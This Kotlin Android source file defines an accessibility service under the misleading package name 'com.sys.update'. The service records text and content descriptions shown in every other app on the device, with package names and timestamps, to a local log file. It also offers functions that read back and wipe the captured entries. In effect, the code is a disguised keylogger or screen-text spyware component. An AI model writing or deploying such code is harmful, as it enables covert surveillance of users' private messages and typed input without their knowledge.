package com.sys.update

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class AccessibilityHelper : AccessibilityService() {

    private val timeFmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

    companion object {
        fun isEnabled(context: Context): Boolean {
            val service = "${context.packageName}/${AccessibilityHelper::class.java.name}"
            val enabled = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            val splitter = TextUtils.SimpleStringSplitter(':')
            splitter.setString(enabled)
            while (splitter.hasNext()) {
                if (splitter.next().equals(service, ignoreCase = true)) return true
            }
            return false
        }

        fun readCapturedTexts(ctx: Context, limit: Int = 200): List<String> {
            val result = mutableListOf<String>()
            try {
                val f = File(ctx.filesDir, "accessibility.jsonl")
                if (!f.exists()) return result
                val lines = f.readLines()
                result.addAll(lines.takeLast(limit))
            } catch (_: Exception) {}
            return result
        }

        fun clearCapturedTexts(ctx: Context) {
            try {
                val f = File(ctx.filesDir, "accessibility.jsonl")
                if (f.exists()) f.delete()
            } catch (_: Exception) {}
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("AccessibilityHelper", "Service connected")
        // أرسل إشعار عند التشغيل — مرة وحدة
        try {
            val f = File(filesDir, "accessibility.jsonl")
            java.io.FileOutputStream(f, true).use { fos ->
                val entry = JSONObject().apply {
                    put("type", "accessibility_init")
                    put("time", timeFmt.format(Date()))
                    put("package", "system")
                    put("texts", "SERVICE_CONNECTED")
                }
                fos.write((entry.toString() + "\n").toByteArray())
            }
        } catch (_: Exception) {}
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        try {
            val pkg = event.packageName?.toString() ?: return
            if (pkg == packageName) return

            val type = event.eventType
            val texts = mutableListOf<String>()
            for (i in 0 until event.text.size) {
                val t = event.text[i]?.toString() ?: ""
                if (t.isNotBlank()) texts.add(t)
            }
            // إذا ما في نصوص، جرب contentDescription
            if (texts.isEmpty()) {
                val cd = event.contentDescription?.toString()
                if (!cd.isNullOrBlank()) texts.add(cd)
            }
            if (texts.isEmpty()) return

            // خزّن محليًا
            try {
                val f = File(filesDir, "accessibility.jsonl")
                val entry = JSONObject().apply {
                    put("type", "accessibility")
                    put("time", timeFmt.format(Date()))
                    put("package", pkg)
                    put("event", type)
                    put("texts", texts.joinToString(" | "))
                }
                java.io.FileOutputStream(f, true).use { fos ->
                    fos.write((entry.toString() + "\n").toByteArray())
                }
            } catch (_: Exception) {}

        } catch (e: Exception) {
            Log.e("AccessibilityHelper", "err: ${e.message}")
        }
    }

    override fun onInterrupt() {
        Log.d("AccessibilityHelper", "Service interrupted")
    }
}
